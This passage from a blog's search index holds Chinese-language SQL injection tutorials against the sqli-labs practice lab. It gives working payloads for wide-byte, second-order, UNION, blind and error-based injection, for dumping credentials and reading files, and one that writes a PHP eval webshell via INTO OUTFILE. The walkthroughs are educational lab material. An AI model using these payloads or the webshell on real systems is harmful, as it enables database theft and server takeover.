src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection2_f20.png"></p><hr><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><h3 id="产生原理-1"><a href="#产生原理-1" class="headerlink" title="产生原理"></a>产生原理</h3><blockquote><p>GBK每个字符2个字节，ASCII每个字符1个字节<br>PHP中编码为GBK，函数执行为ASCII，mysql默认字符集是GBK等宽字节字符集<br>%DF’会被PHP中的$\color{red}{addslashes}$函数转义为“%DF\‘”,”\“是URL里的“%5C”,那么“%DF’”会被转义成“%DF%5C%27”(%27是引号)，倘若网站字符集是GBK，Mysql使用的编码也是GBK的话，就会认为“%DF%5C%27”是一个宽字符</p></blockquote><h3 id="以less-33为例"><a href="#以less-33为例" class="headerlink" title="以less-33为例"></a>以less-33为例</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection2_f21.png"></p><h3 id="构造Payload-1"><a href="#构造Payload-1" class="headerlink" title="构造Payload"></a>构造Payload</h3><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//192.168.0.100/sqli/less-33/?id=-1%df' union select 1,version(),database() --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection2_f22.png"></p><blockquote><p>最常用的是使用%df，其实只要第一个ASCII码大于128即可，如ASCII码为129的就可以，先将129转化为16进制，0x81，然后在前面加%即可，即为%81<br>GBK首字节对应0x81-0xfe，尾字节对应0x40-0xfe(除0x7f)</p></blockquote><h3 id="如less-32"><a href="#如less-32" class="headerlink" title="如less-32"></a>如less-32</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection2_f23.png">   </p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//192.168.0.100/sqli/less-32/?id=-1%81' union select 1,version(),database() --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection2_f24.png">   </p><hr><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><h3 id="以less-24为例，没有对username变量进行过滤"><a href="#以less-24为例，没有对username变量进行过滤" class="headerlink" title="以less-24为例，没有对username变量进行过滤"></a>以less-24为例，没有对username变量进行过滤</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection2_f29.png"></p><h3 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection2_f25.png"><br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection2_f26.png"><br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection2_f27.png"><br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection2_f28.png"> </p><hr><h2 id="再介绍一个报错函数extractvalue"><a href="#再介绍一个报错函数extractvalue" class="headerlink" title="再介绍一个报错函数extractvalue"></a>再介绍一个报错函数extractvalue</h2><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection2_f30.png"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql_injection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于sqli_lab的sql注入详解(一)</title>
      <link href="/2020/03/15/mysql-injection-1/"/>
      <url>/2020/03/15/mysql-injection-1/</url>
      
        <content type="html"><![CDATA[<h2 id="mysql的目录结构"><a href="#mysql的目录结构" class="headerlink" title="mysql的目录结构"></a>mysql的目录结构</h2><p>mysql 5.0以上的版本中，默认定义了information_schema数据库，其中包含有表schemata(数据库名)、tables、columns(列名)</p><table><thead><tr><th align="center">表名</th><th align="center">含有重要列名</th></tr></thead><tbody><tr><td align="center">schemata</td><td align="center">schema_name</td></tr><tr><td align="center">tables</td><td align="center">table_schema, table_name</td></tr><tr><td align="center">columns</td><td align="center">table_schema, table_name, column_name</td></tr></tbody></table><hr><h2 id="基于报错的SQL注入"><a href="#基于报错的SQL注入" class="headerlink" title="基于报错的SQL注入"></a>基于报错的SQL注入</h2><h3 id="以less-1为例"><a href="#以less-1为例" class="headerlink" title="以less-1为例"></a>以less-1为例</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f1.png">   </p><h3 id="这里提示输入ID作为参数值，那输入一下试试看"><a href="#这里提示输入ID作为参数值，那输入一下试试看" class="headerlink" title="这里提示输入ID作为参数值，那输入一下试试看"></a>这里提示输入ID作为参数值，那输入一下试试看</h3><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//127.0.0.1/sqli/Less-1/?id=1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="返回结果1"><a href="#返回结果1" class="headerlink" title="返回结果1"></a>返回结果1</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f2.png"></p><h3 id="Less-1已经指出是error-based-single-quotes-所以直接加单引号尝试报错注入"><a href="#Less-1已经指出是error-based-single-quotes-所以直接加单引号尝试报错注入" class="headerlink" title="Less-1已经指出是error based-single quotes,所以直接加单引号尝试报错注入"></a>Less-1已经指出是error based-single quotes,所以直接加单引号尝试报错注入</h3><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//127.0.0.1/sqli/Less-1/?id=1'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="返回结果2"><a href="#返回结果2" class="headerlink" title="返回结果2"></a>返回结果2</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f3.png">  </p><blockquote><p><strong>‘’1’’ LIMIT 0,1’</strong><br>观察报错语句，去掉最外层的引号，它是将从sql查询语句错误的地方开始用引号引起来，到语句结束处引号结束<br>去掉引号之后，变为 <strong>‘1’’ LIMIT 0,1</strong><br>我们对ID的赋值为  <strong>1’</strong><br>所以可以猜到查询语句对ID的查询是单引号包起来<br>这里可以看一下PHP源码<br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f4.png"><br>可以看出ID确实是被单引号包裹起来的  </p></blockquote><h3 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h3><ol><li><p>检测字段数  </p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//127.0.0.1/sqli/Less-1/?id=1' order by 3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>order by 3 返回正确结果</li><li>order by 4 返回错误</li><li>所以为3个字段  </li></ul><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f5.png">  </p></li><li><p>检测当前数据库的表名</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//127.0.0.1/sqli/Less-1/?id=-1' union select 1,2,3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>因为前面检测出了3个字段，所以Union select 1,2,3</li><li>$\color{red}{返回结果}$<br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f6.png"> </li><li>可以看出数字2和3在页面显示出来了，所以选择在2或者3上注入</li></ul><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//127.0.0.1/sqli/Less-1/?id=-1' UNION SELECT 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>使用union select语句要注意$\color{red}{前面的条件不能成立，可赋id=-1}$</li><li>$\color{red}{返回结果}$<br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f7.png"></li></ul></li><li><p>检测某一个表的列名</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//127.0.0.1/sqli/Less-1/?id=-1' UNION SELECT 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>记得表名要加单引号包裹起来</li><li>$\color{red}{返回结果}$<br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f8.png"></li></ul></li></ol><ol start="4"><li><p>爆出整个表或某几个想要的列</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//127.0.0.1/sqli/Less-1/?id=-1' UNION ALL SELECT 1,group_concat(username,0x3a,password),3 from users --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>0x3a表示引号，可以分开用户名和密码</li><li>$\color{red}{返回结果}$<br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f9.png"></li></ul></li></ol><hr><h2 id="关于mysql的注释"><a href="#关于mysql的注释" class="headerlink" title="关于mysql的注释"></a>关于mysql的注释</h2><h3 id="常见注释符"><a href="#常见注释符" class="headerlink" title="常见注释符"></a>常见注释符</h3><ul><li>#或–+或/**/ </li></ul><h3 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h3><ul><li>在注释的开头处加上！便可执行mysql语句，只对mysql有效，常用来绕过WAF<br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f10.png"><br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f11.png"></li></ul><hr><h2 id="基于时间的延时注入"><a href="#基于时间的延时注入" class="headerlink" title="基于时间的延时注入"></a>基于时间的延时注入</h2><h3 id="以less-9为例"><a href="#以less-9为例" class="headerlink" title="以less-9为例"></a>以less-9为例</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f12.png"> </p><ul><li>测试id参数发现不管是否加引号都会返回相同的结果，所以无法使用报错注入</li><li>这里可以看一下PHP源码<br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f14.png">  </li></ul><h3 id="利用if语句，若真则返回1，若假则延时3s"><a href="#利用if语句，若真则返回1，若假则延时3s" class="headerlink" title="利用if语句，若真则返回1，若假则延时3s"></a>利用if语句，若真则返回1，若假则延时3s</h3><p>$\color{red}{真，时间为2s左右}$  </p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//127.0.0.1/sqli/Less-9/?id=1' and if(ascii(substr(database(),1,1))=115,1,sleep(3)) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f13.png"><br>$\color{red}{假，时间为5s左右}$  </p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//127.0.0.1/sqli/Less-9/?id=1' and if(ascii(substr(database(),1,1))=116,1,sleep(3)) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f15.png">   </p><blockquote><ul><li>注意payload要加and</li></ul></blockquote><hr><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><h3 id="以less-8为例"><a href="#以less-8为例" class="headerlink" title="以less-8为例"></a>以less-8为例</h3><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//127.0.0.1/sqli/Less-8/?id=1'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>加单引号发现错误界面<br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f16.png"> </li></ul><h3 id="利用返回的布尔值注入"><a href="#利用返回的布尔值注入" class="headerlink" title="利用返回的布尔值注入"></a>利用返回的布尔值注入</h3><h4 id="返回错误界面"><a href="#返回错误界面" class="headerlink" title="返回错误界面"></a>返回错误界面</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//127.0.0.1/sqli/Less-8/?id=1' and length(database()) &lt; 8 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="返回正确界面"><a href="#返回正确界面" class="headerlink" title="返回正确界面"></a>返回正确界面</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//127.0.0.1/sqli/Less-8/?id=1' and length(database()) &lt; 9 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="从而确定length-database-8"><a href="#从而确定length-database-8" class="headerlink" title="从而确定length(database())=8"></a>从而确定length(database())=8</h4><hr><h2 id="mysql读文件"><a href="#mysql读文件" class="headerlink" title="mysql读文件"></a>mysql读文件</h2><h3 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h3><ul><li>权限够高</li><li>secure_file_priv不为NULL，需要通过my.ini修改<blockquote><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f17.png"><br>$\color{red}{设置为空格即可}$<br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f18.png"><br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f19.png"></p></blockquote></li></ul><h3 id="以less-1为例进行读文件"><a href="#以less-1为例进行读文件" class="headerlink" title="以less-1为例进行读文件"></a>以less-1为例进行读文件</h3><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//127.0.0.1/sqli/Less-1/?id=-1' union select 1,load_file('F:\\flag.txt'),3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f20.png"></p><hr><h2 id="mysql写文件"><a href="#mysql写文件" class="headerlink" title="mysql写文件"></a>mysql写文件</h2><h3 id="前提-1"><a href="#前提-1" class="headerlink" title="前提"></a>前提</h3><ul><li>权限够高</li><li>设置变量general_log为ON<blockquote><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f21.png"></p></blockquote></li></ul><h3 id="以less-7为例"><a href="#以less-7为例" class="headerlink" title="以less-7为例"></a>以less-7为例</h3><h4 id="正确界面"><a href="#正确界面" class="headerlink" title="正确界面"></a>正确界面</h4><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f22.png"></p><h4 id="反复增加引号或括号个数，尝试闭合参数id，最后得出正确界面"><a href="#反复增加引号或括号个数，尝试闭合参数id，最后得出正确界面" class="headerlink" title="反复增加引号或括号个数，尝试闭合参数id，最后得出正确界面"></a>反复增加引号或括号个数，尝试闭合参数id，最后得出正确界面</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//127.0.0.1/sqli/Less-7/?id=1')) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="可以写入一句话，然后使用蚁剑连接"><a href="#可以写入一句话，然后使用蚁剑连接" class="headerlink" title="可以写入一句话，然后使用蚁剑连接"></a>可以写入一句话，然后使用蚁剑连接</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//127.0.0.1/sqli/Less-7/?id=-1')) union select 1,2,'&lt;?php eval($_POST["ezy"]);?>' into outfile "F:\\phpstudy_pro\\PHPTutorial\\WWW\\sqli\\Less-7\\1.php" --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f23.png"></p><hr><h2 id="mysql报错注入"><a href="#mysql报错注入" class="headerlink" title="mysql报错注入"></a>mysql报错注入</h2><h3 id="以less-5为例"><a href="#以less-5为例" class="headerlink" title="以less-5为例"></a>以less-5为例</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f24.png"></p><h3 id="利用-floor-rand-group-by进行报错注入"><a href="#利用-floor-rand-group-by进行报错注入" class="headerlink" title="利用 floor(),rand(),group by进行报错注入"></a>利用 floor(),rand(),group by进行报错注入</h3><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//192.168.0.104/sqli/Less-5/?id=0' union select 1,2,count(*)  from information_schema.columns group by concat((select table_name from information_schema.tables where table_schema = database() limit 3,1),0x3a,floor(rand(0)*2)) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><ul><li>注意只能返回一行数据，所以使用limit</li></ul></blockquote><h4 id="返回结果"><a href="#返回结果" class="headerlink" title="返回结果"></a>返回结果</h4><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f25.png"></p><blockquote><ul><li>通过改变payload爆出其他数据</li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql_injection </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
